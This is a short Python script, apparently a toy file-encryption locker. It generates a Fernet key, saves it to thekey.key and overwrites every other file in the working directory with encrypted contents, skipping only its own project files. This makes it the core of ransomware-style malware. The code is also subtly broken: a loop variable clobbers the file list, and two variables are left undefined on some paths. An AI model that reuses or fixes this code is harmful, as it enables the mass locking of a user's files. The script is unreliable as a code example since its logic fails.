import os
from cryptography.fernet import Fernet
#a
files = []

for files in os.listdir():
    if files == 'thekey.key':
        sure = True
if sure:
    inp = str(input('Documents alredy encrypted, want to do this again ? (y/n)'))
    
if inp == 'y':
    for file in os.listdir():
        if file == 'encrypt.py' or file == '.gitattributes' or file == 'README.md' or file == 'decrypt.py':
            continue
        if file != "thekey.key":
            if os.path.isfile(file):
                files.append(file)

    key = Fernet.generate_key()
    print(key)

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
else:
    pass
